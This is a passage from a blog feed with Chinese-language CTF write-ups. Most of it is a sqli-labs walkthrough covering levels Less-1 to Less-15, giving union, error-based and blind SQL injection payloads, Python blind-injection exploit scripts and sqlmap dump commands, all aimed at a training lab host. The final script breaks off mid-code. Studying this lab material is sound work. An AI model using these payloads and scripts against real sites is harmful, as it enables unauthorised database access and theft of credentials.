class="comment">&lt;!--flagåœ¨flagè¡¨é‡Œ--&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>          flag<span class="tag">&lt;<span class="name">br</span>&gt;</span>          2<span class="tag">&lt;<span class="name">br</span>&gt;</span>          SICTF</span><span class="template-variable">&#123;633db818-0209-465a-9d1c-dfbc36a469e3&#125;</span><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>è‡ªæµ‹ä¸€ä¸‹æ— åˆ—åæ³¨å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection <span class="built_in">id</span>:    5</span><br><span class="line">Current database: hcj_db</span><br><span class="line"></span><br><span class="line">+----+------------+----------+</span><br><span class="line">| <span class="built_in">id</span> | username   | password |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">|  1 | hcj        | 123456   |</span><br><span class="line">|  2 | nacl       | 123456   |</span><br><span class="line">| 13 | cabbage    | 12345678 |</span><br><span class="line">| 14 | qwert      | qwert    |</span><br><span class="line">| 15 | qwerty     | qwerty   |</span><br><span class="line">| 16 | cabbaget   | 12345678 |</span><br><span class="line">| 17 | cabbagety  | 12345678 |</span><br><span class="line">| 18 | asdf       | asdf     |</span><br><span class="line">| 19 | asdfg      | asdfg    |</span><br><span class="line">| 20 | www        | wwww     |</span><br><span class="line">| 21 | sss        | sss      |</span><br><span class="line">| 22 | cabbagetya | 12345678 |</span><br><span class="line">| 23 | ddd        | ddd      |</span><br><span class="line">| 24 | xxx        | xxx      |</span><br><span class="line">| 25 | fff        | fff      |</span><br><span class="line">| 26 | ffff       | fff      |</span><br><span class="line">| 27 | fffff      | fff      |</span><br><span class="line">| 28 | <span class="built_in">cat</span>        | <span class="built_in">cat</span>      |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">18 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">id</span> from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>= 1 union <span class="keyword">select</span> `2` from (<span class="keyword">select</span> 1,2,3 union <span class="keyword">select</span> * from <span class="built_in">users</span>)a;</span><br><span class="line">+------------+</span><br><span class="line">| <span class="built_in">id</span>         |</span><br><span class="line">+------------+</span><br><span class="line">| 1          |</span><br><span class="line">| 2          |</span><br><span class="line">| hcj        |</span><br><span class="line">| nacl       |</span><br><span class="line">| cabbage    |</span><br><span class="line">| qwert      |</span><br><span class="line">| qwerty     |</span><br><span class="line">| cabbaget   |</span><br><span class="line">| cabbagety  |</span><br><span class="line">| asdf       |</span><br><span class="line">| asdfg      |</span><br><span class="line">| www        |</span><br><span class="line">| sss        |</span><br><span class="line">| cabbagetya |</span><br><span class="line">| ddd        |</span><br><span class="line">| xxx        |</span><br><span class="line">| fff        |</span><br><span class="line">| ffff       |</span><br><span class="line">| fffff      |</span><br><span class="line">| <span class="built_in">cat</span>        |</span><br><span class="line">+------------+</span><br><span class="line">20 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;100ï¼…-upload&quot;&gt;&lt;a href=&quot;#100ï¼…-upload&quot; class=&quot;headerlink&quot; title=&quot;100ï¼…_upload&quot;&gt;&lt;/a&gt;100ï¼…_upload&lt;/h2&gt;&lt;p&gt;é¦–å…ˆæ„é€ åç¼€å.php.&lt;/p&gt;
&lt;p&gt;poc:&lt;/p&gt;
&lt;figu</summary>
      
    
    
    
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
    <category term="phpç¯å¢ƒå˜é‡æ³¨å…¥" scheme="http://example.com/tags/php%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqlæ— åˆ—åæ³¨å…¥" scheme="http://example.com/tags/sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://example.com/2024/02/18/sqli-labs/"/>
    <id>http://example.com/2024/02/18/sqli-labs/</id>
    <published>2024-02-18T05:00:58.000Z</published>
    <updated>2024-02-19T12:19:56.854Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:emails,referers,uagents,users</p><p>Your Password:3</p><p>æ™®é€šçš„å­—ç¬¦å‹è”åˆæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password</p><p>Your Password:3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(id,username,password),3 from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>å’ŒLess-1 å‡ ä¹ç›¸åŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql-labs/Less-1/</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(id,username,password) from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>è¾“å…¥: ?id&#x3D;1â€™</p><p>â€¦â€¦..for the right syntax to use near â€˜â€™1â€™â€™) LIMIT 0,1â€™ at line 1 </p><p>å…³é”®åœ¨: <code>&#39;  &#39;1&#39;&#39;) LIMIT 0,1 &#39;</code></p><p>ç³»ç»Ÿç»™è¾“å…¥çš„å†…å®¹å¢åŠ äº†ä¸€ä¸ª<code>&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,database()%23</span><br></pre></td></tr></table></figure><p>å…¶ä½™æ­¥éª¤ä¸å‰å‡ å…³ç›¸åŒ</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>è¾“å…¥å•å¼•å·å¹¶ä¸æŠ¥é”™,è€Œè¾“å…¥åŒå¼•å·ä¼šæŠ¥é”™</p><p>ä¸Less-3 ç±»ä¼¼,åªä¸è¿‡ä½¿ç”¨äº†<code>&quot;)</code>åŒ…è£¹å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>æ²¡æœ‰å›æ˜¾username,æŠ¥é”™æ³¨å…¥ç§’äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>çœ‹ç½‘ä¸Šè¿˜æœ‰ç”¨group by åŒæŸ¥è¯¢æ³¨å…¥çš„</p><p>å…³äºåŒæŸ¥è¯¢æ³¨å…¥:</p><p><a href="https://juejin.cn/post/7276696853893627956">https://juejin.cn/post/7276696853893627956</a></p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>Less-5çš„å•å¼•å·é—­åˆæ”¹ä¸ºåŒå¼•å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨extractvalue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database()))%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))%23</span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>è¿™å…³ç”¨<code>((&#39;  &#39;))</code>åŒ…è£¹å˜é‡</p><p>æµ‹è¯•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and sleep(5)%23</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾ˆæ˜æ˜¾å¯ä»¥ä½¿ç”¨æ—¶é—´æ³¨å…¥</p><p>ä¸è¿‡æµ‹è¯•äº†ä¸€ä¸‹å‘ç°å¸ƒå°”ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and ascii(substr(database(),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>ä¸è¿‡åº”è¯¥éƒ½æ˜¯éé¢„æœŸ,ç½‘ä¸Šè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•,æ­£æ˜¯ä½¿ç”¨æç¤ºä¸­çš„<code>outfile</code></p><p><strong><strong>æ–‡ä»¶ä¸Šä¼ </strong></strong></p><p>éœ€è¦æ›´æ”¹mysqlçš„é…ç½®æ–‡ä»¶,å°† secure-file-priv ç½®ä¸ºç©º,å³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv=</span><br></pre></td></tr></table></figure><p>ä¹‹åç¼–å†™payload:</p><p>1â€™)) union select 1,2,database() into outfile â€˜æ–‡ä»¶è¦è¢«ä¿å­˜çš„è·¯å¾„â€™%23</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>æ¢æµ‹åˆ°é—­åˆæ–¹å¼ä¸ºå•å¼•å·,ä¸”æ— å›æ˜¾,ä½†å¯ä»¥åˆ©ç”¨æ˜¯å¦è¿”å›<code>You are in...........</code>æ¥å®ç°å¸ƒå°”æ³¨å…¥</p><p>ç¼–å†™exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">host = <span class="string">&quot;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line"><span class="comment">#sql = &quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and (ascii(substr(&quot;</span>+ <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šå¯ä»¥sqlmapä¸€æŠŠæ¢­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> --dbs</span><br><span class="line"></span><br><span class="line">available databases [6]:</span><br><span class="line">[*] `security`</span><br><span class="line">[*] ctftraining</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining --tables</span><br><span class="line"></span><br><span class="line">[00:50:30] [INFO] retrieved: 3</span><br><span class="line">[00:50:30] [INFO] retrieved: flag</span><br><span class="line">[00:50:32] [INFO] retrieved: news</span><br><span class="line">[00:50:34] [INFO] retrieved: <span class="built_in">users</span></span><br><span class="line">Database: ctftraining</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| news  |</span><br><span class="line">| <span class="built_in">users</span> |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag --columns</span><br><span class="line"></span><br><span class="line">[00:52:08] [INFO] retrieved: 1</span><br><span class="line">[00:52:08] [INFO] retrieved: flag</span><br><span class="line">[00:52:10] [INFO] retrieved: char(128)</span><br><span class="line">Database: ctftraining</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+-----------+</span><br><span class="line">| Column | Type      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| flag   | char(128) |</span><br><span class="line">+--------+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag -C flag --dump</span><br><span class="line"></span><br><span class="line">[00:58:14] [INFO] retrieved: 1</span><br><span class="line">[00:58:15] [INFO] retrieved: flag&#123;fff4e3e8-56b7-4dba-b3e0-6094092c0666&#125;</span><br><span class="line">Database: ctftraining</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag                                       |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag&#123;fff4e3e8-56b7-4dba-b3e0-6094092c0666&#125; |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line"></span><br><span class="line">tips:è¿™é‡Œè·å–çš„æ—¶å€™å‡ºé”™äº†ä¸€æ¬¡,ä¸‹æ¬¡dumpæ—¶ä¼šç›´æ¥è¿”å›ç¼“å­˜æ–‡ä»¶ä¸­é”™è¯¯çš„å†…å®¹è€Œä¸æ˜¯æ³¨å…¥,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨-flush-sessionå‚æ•°æ¥åˆ·æ–°ç¼“å­˜</span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag -C flag --dump -flush-session</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>æ¢æµ‹åˆ°å•å¼•å·é—­åˆ,ä¸”è¿™æ¬¡åªè¦æœ‰è¾“å…¥éƒ½ä¼šå›æ˜¾You are inâ€¦â€¦â€¦..</p><p>ä½†æ˜¯sleep(5)ä¼šè¢«æ‰§è¡Œ,æ‰€ä»¥ä¸ºæ—¶é—´ç›²æ³¨</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host = <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-9/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and if(ascii(substr(&quot;</span>+ <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),1)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219141744631.png" alt="image-20240219141744631"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨sqlmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=T -u &#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-9/?id=1&#x27; -D ctftraining -T flag -C flag --dump -flush-session</span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥è·å–flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219142725988.png" alt="image-20240219142725988"></p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>ä¸Less-9ä¸åŒä¹‹å¤„åœ¨äºæ­¤é¢˜ä½¿ç”¨åŒå¼•å·é—­åˆ</p><p>å°†Less-9çš„expä¸­å•å¼•å·é—­åˆæ”¹ä¸ºåŒå¼•å·å³å¯</p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>è¿™é‡Œå…¶å®æ˜¯å¯ä»¥unionæ³¨å…¥çš„</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=-1&amp;Submit=submit&amp;uname=-1&#x27; union select flag,2 from ctftraining.flag--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219144027646.png" alt="image-20240219144027646"></p><p>ä½†é¢˜ç›®ç»™å‡ºçš„tagæ˜¯æŠ¥é”™æ³¨å…¥,è¿˜æ˜¯å°è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Submit=submit&amp;passwd=-1&amp;uname=-1&#x27; and updatexml(1,concat(0x7e,(select substr(flag,1,30) from ctftraining.flag),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">Submit=submit&amp;passwd=-1&amp;uname=-1&#x27; and updatexml(1,concat(0x7e,(select substr(flag,30,100) from ctftraining.flag),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219144902177.png" alt="image-20240219144902177"></p><p>ç¼ºç‚¹æ˜¯æŠ¥é”™æ³¨å…¥åªæ˜¾ç¤ºéƒ¨åˆ†å­—ç¬¦ä¸²,éœ€è¦substræ¥æˆªå–</p><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>ä½¿ç”¨<code>&quot;)</code>é—­åˆ,å…¶ä»–ä¸Less-11ç›¸åŒ</p><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>ä½¿ç”¨<code>&#39;)</code>é—­åˆ,å…¶ä»–ä¸Less-11ç›¸åŒ</p><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>ä½¿ç”¨<code>&quot;</code>é—­åˆä¹Ÿå¯ä»¥ç›´æ¥æŠ¥é”™æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219170929047.png" alt="image-20240219170929047"></p><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢„æœŸ, é¢˜ç›®tagå†™çš„å¹¶ä¸æ˜¯åŒå¼•å·é—­åˆ</p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>postç™»å½•,ä¸‡èƒ½å¯†ç <code>&#39; or 1=1--+</code>æµ‹å‡ºæ³¨å…¥ç‚¹</p><p>ç™»å½•æˆåŠŸè¿”å›flag.jpg(æç¤ºç™»å½•æˆåŠŸ)</p><p>ç™»å½•å¤±è´¥è¿”å›slap.jpg(æç¤ºç™»å½•å¤±è´¥)</p><p>è¿™é‡Œç¼–å†™expçš„æ—¶å€™å‡ºç°äº†ä¸€ä¸ªå°æ’æ›²</p><p>æˆ‘åœ¨ç”¨ä½¿ç”¨requestsæ¨¡å—å‘åŒ…æ—¶,åŒæ ·çš„æ•°æ®,åœ¨hackbarä¸­å›æ˜¾flag.jpgè€Œç”¨pythonå‘åŒ…å´å›æ˜¾slap.jpg</p><p>ç™¾èˆ¬ç–‘æƒ‘ä¹‹å,ç”¨burpæŠ“åŒ…å¹¶ä½¿ç”¨compareræ¨¡å—è¿›è¡Œå¯¹æ¯”</p><p>å·¦ä¸ºpythonå‘åŒ…,å³å›¾ä¸ºhackbarå‘åŒ…</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219182436378.png" alt="image-20240219182436378"></p><p>éå¸¸çš„amazing,è¿™é‡Œpythonå°†<code>+</code>åˆè¿›è¡Œäº†ä¸€æ¬¡urlencodeå˜æˆäº†%2B,ä½†æ˜¯<code>+</code>æœ¬èº«å°±æ˜¯ç©ºæ ¼ç»è¿‡ä¸€æ¬¡urlencodeçš„ç»“æœ,æˆ‘ä»¬æ˜¯æƒ³ä¼ å…¥ç©ºæ ¼è€Œä¸æ˜¯åŠ å·è¿™ä¸ªå­—ç¬¦</p><p>æœ€åçš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»£ç†åˆ°bp</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span 